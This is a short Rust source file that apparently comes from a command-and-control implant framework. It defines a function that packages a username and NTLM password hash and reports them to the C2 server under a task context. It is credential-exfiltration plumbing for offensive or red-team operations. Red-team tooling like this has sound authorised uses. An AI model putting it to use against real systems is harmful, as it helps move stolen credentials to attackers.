use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::Agent;
use pb::c2::TaskContext;
use pb::{c2, eldritch};

pub fn ntlm_hash(
    agent: Arc<dyn Agent>,
    task_context: TaskContext,
    username: String,
    hash: String,
) -> Result<(), String> {
    let cred = eldritch::Credential {
        principal: username,
        secret: hash,
        kind: 3, // KIND_NTLM_HASH
    };
    let req = c2::ReportCredentialRequest {
        context: Some(c2::report_credential_request::Context::TaskContext(
            task_context,
        )),
        credential: Some(cred),
    };
    agent.report_credential(req).map(|_| ())
}
